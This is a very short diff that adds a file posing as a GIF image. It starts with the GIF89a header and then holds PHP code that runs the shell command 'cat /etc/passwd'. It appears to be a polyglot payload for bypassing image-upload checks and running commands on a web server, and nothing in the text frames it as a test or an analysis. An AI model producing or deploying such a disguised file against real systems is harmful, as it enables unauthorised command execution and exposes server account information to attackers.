@@ -1,0 +1,5 @@
+GIF89a;
+
+<?php
+
+shell_exec("cat /etc/passwd");
